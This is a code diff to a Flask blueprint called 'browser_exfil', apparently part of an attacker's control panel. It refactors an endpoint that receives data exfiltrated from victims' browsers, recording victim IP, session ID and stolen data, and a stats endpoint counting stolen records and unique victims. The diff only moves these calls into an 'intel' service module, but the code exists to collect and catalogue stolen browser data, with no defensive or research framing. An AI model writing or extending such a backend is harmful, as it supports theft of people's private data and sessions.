@@ -11,6 +11,7 @@ from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
 import database as db
 
 from collections import defaultdict
+from app.services import intel as intelsvc
 bp = Blueprint("browser_exfil", __name__,
                template_folder=os.path.join(BASE_DIR, "flask_templates"))
 
@@ -25,21 +26,11 @@ def api_browser_exfil_receive():
     exfil_data = data.get('data', {})
     metadata = data.get('metadata', {})
     metadata['user_agent'] = request.headers.get('User-Agent', '')
-    exfil_id = db.save_browser_exfil(victim_ip, session_id, data_type, exfil_data, metadata)
+    exfil_id = intelsvc.save_browser_exfil(victim_ip, session_id, data_type, exfil_data, metadata)
     return jsonify({'status': 'received', 'id': exfil_id})
 
 @bp.route('/api/browser-exfil/stats')
 def api_browser_exfil_stats():
     if 'IAm-logined' not in session:
         return jsonify({'error': 'Not authenticated'}), 401
-    all_data = db.get_browser_exfil()
-    stats = defaultdict(int)
-    ips = set()
-    for d in all_data:
-        stats[d.get('data_type', 'unknown')] += 1
-        ips.add(d.get('victim_ip', ''))
-    return jsonify({
-        'total': len(all_data),
-        'by_type': dict(stats),
-        'unique_victims': len(ips),
-    })
+    return jsonify(intelsvc.browser_exfil_stats())
